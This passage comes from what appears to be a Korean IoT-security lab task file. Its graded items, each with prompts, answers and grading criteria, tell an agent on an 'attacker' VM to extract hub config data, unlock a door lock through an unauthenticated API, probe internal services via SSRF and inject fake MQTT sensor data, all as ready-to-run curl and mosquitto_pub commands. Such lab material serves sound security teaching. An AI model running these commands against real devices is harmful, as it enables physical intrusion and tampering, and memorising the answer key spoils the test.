      - 동등한 대체 도구 사용
      - IoT 보안 관련 도구 체인
      - 결과를 파일/로그에 저장
      negative_signs:
      - 실행 없이 개념 설명만
      - 결과 확인 누락
      - IoT 보안와 무관한 기법
  target_vm: attacker
  script: curl -s http://10.20.30.80:8090/api/config 2>/dev/null | python3 -m json.tool 2>/dev/null | head -20; echo '설정 정보
    수집 완료'
  risk_level: low
  bastion_prompt: 허브 설정 정보(/api/config)에서 민감 데이터를 추출해줘
- order: 3
  instruction: API를 통해 현관 도어락(lock_front)을 해제하시오.
  hint: POST /api/devices/lock_front/control에 action:unlock을 전송하세요.
  category: attack
  points: 12
  answer: "\U0001F916 프롬프트: API를 통해 현관 도어락(lock_front)을 해제해줘\n\U0001F4CE 참고 (CLI): curl -s \\\n     -X POST http://10.20.30.80:8090/api/devices/lock_front/control\
    \ \\\n     -H 'Content-Type:application/json' \\\n     -d '{\"action\":\"unlock\"}' 2>/dev/null; echo 'API 도어락 해제 완료'"
  answer_detail: 인증 없는 API로 도어락을 해제할 수 있으면 물리적 보안 위협이 됩니다.
  verify:
    type: output_contains
    expect: null
    field: stdout
    semantic:
      intent: 'IoT 보안 w10 s3 — API를 통해 현관 도어락(lock_front)을 해제하시오. (cmd: curl -s \      -X POST http://10.20.30.80:8090/api/devices/lock_front/control
        \ )'
      success_criteria:
      - '명령 실행: curl -s \      -X POST http://10.20.30.80:8090/api/devices/l'
      - 결과 출력 또는 로그 확인
      - IoT 보안 실습 맥락 유지
      acceptable_methods:
      - 제시된 CLI 명령 그대로 실행
      - 동등한 대체 도구 사용
      - IoT 보안 관련 도구 체인
      - 결과를 파일/로그에 저장
      negative_signs:
      - 실행 없이 개념 설명만
      - 결과 확인 누락
      - IoT 보안와 무관한 기법
  target_vm: attacker
  script: "curl -s \\\n     -X POST http://10.20.30.80:8090/api/devices/lock_front/control \\\n     -H 'Content-Type:application/json'\
    \ \\\n     -d '{\"action\":\"unlock\"}' 2>/dev/null; echo 'API 도어락 해제 완료'"
  risk_level: low
  bastion_prompt: API를 통해 현관 도어락(lock_front)을 해제해줘
- order: 4
  instruction: SSRF 취약점을 이용하여 내부 서비스를 스캔하시오.
  hint: /api/webhook/test?url=http://내부IP 형식을 사용하세요.
  category: attack
  points: 10
  answer: '🤖 프롬프트: SSRF 취약점을 이용하여 내부 서비스를 스캔해줘

    📎 참고 (CLI): curl -s "http://10.20.30.80:8090/api/webhook/test?url=http://127.0.0.1:8088/" 2>/dev/null | head -5; echo
    ''SSRF 테스트 완료'''
  answer_detail: SSRF(Server-Side Request Forgery)로 허브에서 내부 서비스에 접근할 수 있습니다.
  verify:
    type: output_contains
    expect: null
    field: stdout
    semantic:
      intent: 'IoT 보안 w10 s4 — SSRF 취약점을 이용하여 내부 서비스를 스캔하시오. (cmd: curl -s "http://10.20.30.80:8090/api/webhook/test?url=http://127.0.0.1:8088/"
        2>)'
      success_criteria:
      - '명령 실행: curl -s "http://10.20.30.80:8090/api/webhook/test?url=http:/'
      - 결과 출력 또는 로그 확인
      - IoT 보안 실습 맥락 유지
      acceptable_methods:
      - 제시된 CLI 명령 그대로 실행
      - 동등한 대체 도구 사용
      - IoT 보안 관련 도구 체인
      - 결과를 파일/로그에 저장
      negative_signs:
      - 실행 없이 개념 설명만
      - 결과 확인 누락
      - IoT 보안와 무관한 기법
  target_vm: attacker
  script: curl -s "http://10.20.30.80:8090/api/webhook/test?url=http://127.0.0.1:8088/" 2>/dev/null | head -5; echo 'SSRF
    테스트 완료'
  risk_level: low
  bastion_prompt: SSRF 취약점을 이용하여 내부 서비스를 스캔해줘
- order: 5
  instruction: MQTT를 통해 스마트홈 디바이스에 가짜 데이터를 주입하시오.
  hint: mosquitto_pub으로 센서 토픽에 메시지를 발행하세요.
  category: mqtt
  points: 10
  answer: '🤖 프롬프트: MQTT를 통해 스마트홈 디바이스에 가짜 데이터를 주입해줘

    📎 참고 (CLI): mosquitto_pub -h 10.20.30.80 -t ''homeassistant/sensor/temperature/state'' -m ''{"value":-30,"unit":"C"}''
    2>/dev/null && echo ''MQTT 데이터 주입 완료'''
  answer_detail: MQTT 미인증 접근으로 센서 데이터를 조작하면 자동화 규칙이 오동작할 수 있습니다.
  verify:
    type: output_contains
    expect: null
    field: stdout
    semantic:
      intent: 'IoT 보안 w10 s5 — MQTT를 통해 스마트홈 디바이스에 가짜 데이터를 주입하시오. (cmd: mosquitto_pub -h 10.20.30.80 -t ''homeassistant/sensor/temperature/state''
        -m ''{"v)'
      success_criteria:
